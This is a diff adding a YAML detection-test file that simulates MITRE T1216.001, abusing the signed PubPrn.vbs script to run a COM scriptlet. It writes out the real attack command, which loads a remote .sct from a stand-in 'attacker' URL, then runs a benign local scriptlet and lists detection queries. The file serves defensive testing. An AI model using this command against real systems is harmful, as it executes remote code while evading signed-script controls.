@@ -1,0 +1,101 @@
+id: T1216.001_pubprn
+name: "System Script Proxy Execution — PubPrn"
+mitre_technique: "T1216.001"
+mitre_tactic: "defense_evasion"
+description: >
+  PubPrn.vbs is a signed Microsoft VBScript that publishes printers to Active Directory.
+  Adversaries abuse it with a remote .sct (COM scriptlet) URL as the server parameter:
+  cscript.exe /b /nologo PubPrn.vbs 127.0.0.1 script:http://attacker/payload.sct
+  The script: URI causes scrobj.dll to load and execute the remote scriptlet.
+  PubPrn.vbs is signed and shipped with Windows, so it may bypass script execution
+  policies that whitelist signed scripts.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1216/001/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1216.001 — PubPrn proxy execution simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Locate PubPrn.vbs and simulate execution with script: URI"
+    command: |
+      $pubprn = "$env:SystemRoot\System32\Printing_Admin_Scripts\en-US\pubprn.vbs"
+      if (-not (Test-Path $pubprn)) {
+          $pubprn = Get-ChildItem "$env:SystemRoot\System32" -Filter pubprn.vbs `
+              -Recurse -ErrorAction SilentlyContinue |
+              Select-Object -First 1 -ExpandProperty FullName
+      }
+
+      if ($pubprn) {
+          Write-Host "[PAS] PubPrn.vbs found: $pubprn"
+          Write-Host "[PAS] Real attack command:"
+          Write-Host "  cscript.exe /b /nologo $pubprn 127.0.0.1 script:http://attacker/payload.sct"
+
+          # Create a local benign .sct for simulation
+          $sctPath = "$env:TEMP\PAS_T1216_001.sct"
+          Set-Content $sctPath @'
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="PAS" classid="{AAAAAAAA-1111-1111-1111-000000000001}">
+  <script language="VBScript">
+    <![CDATA[
+      Set oSh = CreateObject("WScript.Shell")
+      oSh.Run "cmd /c echo PAS-T1216.001-PUBPRN > %TEMP%\PAS_T1216_001_fired.txt", 0, True
+    ]]>
+  </script>
+</registration>
+</scriptlet>
+'@
+          Write-Host "[PAS] Benign .sct created: $sctPath"
+          Write-Host "[PAS] Executing: cscript.exe $pubprn 127.0.0.1 script:$sctPath"
+          Start-Process cscript.exe `
+              -ArgumentList "/b /nologo `"$pubprn`" 127.0.0.1 script:`"$sctPath`"" `
+              -Wait -NoNewWindow -ErrorAction SilentlyContinue
+          if (Test-Path "$env:TEMP\PAS_T1216_001_fired.txt") {
+              Write-Host "[PAS] PubPrn scriptlet EXECUTED"
+          } else {
+              Write-Host "[PAS] Execution blocked or scrobj.dll not available"
+          }
+      } else {
+          Write-Host "[PAS] PubPrn.vbs not found on this system"
+      }
+
+  - step: 3
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 4
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — cscript.exe executing pubprn.vbs with script: URI argument"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove SCT and output files"
+    command: |
+      @("$env:TEMP\PAS_T1216_001.sct",
+        "$env:TEMP\PAS_T1216_001_fired.txt") |
+          ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
+      Write-Host "[PAS][Cleanup] PubPrn test files removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1216.001 cleanup complete"
+
+analyst_checklist:
+  - "Process event: cscript.exe with pubprn.vbs and 'script:' URI argument"
+  - "Network event: cscript.exe/scrobj.dll making HTTP request (remote .sct fetch)"
+  - "Sentinel: DeviceProcessEvents | where ProcessCommandLine contains 'pubprn' and ProcessCommandLine contains 'script:'"
+  - "Sentinel: DeviceNetworkEvents | where InitiatingProcessFileName == 'cscript.exe' and RemoteUrl contains '.sct'"
+  - "MDE alert: 'PubPrn scriptlet execution'"
+  - "CONTROL CHECK: cscript.exe executing pubprn.vbs is normal; the 'script:' URI parameter is the abuse indicator"
+  - "CONTROL CHECK: scrobj.dll loading from non-system paths should alert"
